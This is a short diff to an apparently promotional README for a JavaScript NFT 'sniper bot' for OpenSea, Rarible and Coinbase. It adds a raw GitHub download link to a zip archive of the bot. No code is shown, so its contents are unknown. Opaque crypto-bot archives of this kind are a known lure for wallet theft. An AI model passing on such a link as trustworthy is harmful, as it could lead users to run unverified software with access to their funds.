@@ -5,6 +5,8 @@ I created a YouTube channel for tutorial on how to configure this and run it pro
 
 You can download the zip file of the JavaScript sniper bot here
 
+https://github.com/kevinstudios/NFT-sniper-bot-works-on-coinbase-opensea-raribles/raw/main/opensea-raribles-coinbase-nft-sniper.zip
+
 Here's what the program looks like when it finds an NFT within your parameters in the settings you can figured. 
 
 
